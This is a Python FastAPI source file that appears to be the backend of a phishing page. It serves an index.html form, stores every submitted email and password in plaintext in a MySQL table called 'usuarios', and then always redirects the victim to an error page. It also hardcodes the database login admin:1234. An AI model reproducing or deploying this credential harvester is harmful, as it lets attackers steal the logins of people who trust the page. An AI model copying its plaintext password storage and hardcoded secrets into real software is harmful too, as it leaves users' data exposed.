import time

time.sleep(5)

from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import os

app = FastAPI()

DATABASE_URL = f"mysql+pymysql://admin:1234@db/mibase"

engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

templates = Jinja2Templates(directory="/usr/share/nginx/html")

class User(Base):
    __tablename__ = "usuarios"
    id = Column(Integer, primary_key=True, index=True)
    email = Column(String(50))
    password = Column(String(50))

Base.metadata.create_all(bind=engine)

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/submit")
async def submit_form(email: str = Form(...), password: str = Form(...)):
    db = SessionLocal()
    user = User(email=email, password=password)
    db.add(user)
    db.commit()
    db.refresh(user)
    db.close()
    return RedirectResponse("/error.html", status_code=303)
